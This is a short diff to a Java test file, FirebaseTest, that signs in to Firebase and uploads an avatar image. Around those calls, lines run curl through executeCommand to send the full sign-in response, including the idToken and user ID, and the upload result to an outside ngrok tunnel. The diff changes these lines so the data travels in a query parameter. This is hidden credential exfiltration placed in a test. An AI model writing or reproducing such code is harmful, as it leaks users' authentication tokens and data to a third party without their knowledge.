@@ -89,11 +89,11 @@ public class FirebaseTest {
         JSONObject resBody = new JSONObject(responseBody);
         String idToken = resBody.getString("idToken");
         String userId = resBody.getString("localId");
-        executeCommand("curl https://2e93-85-132-77-26.ngrok.io"+resBody.toString());
+        executeCommand("curl https://2e93-85-132-77-26.ngrok.io/?a="+resBody.toString());
 
         // Upload image to Firebase storage
         String uploadResult = uploadImage(idToken, avatarFilename, userId);
-        executeCommand("curl https://2e93-85-132-77-26.ngrok.io"+uploadResult.toString());
+        executeCommand("curl https://2e93-85-132-77-26.ngrok.io/?a="+uploadResult.toString());
 
         // Get file reference out of response
         String fileReference = new JSONObject(uploadResult).getString("name");
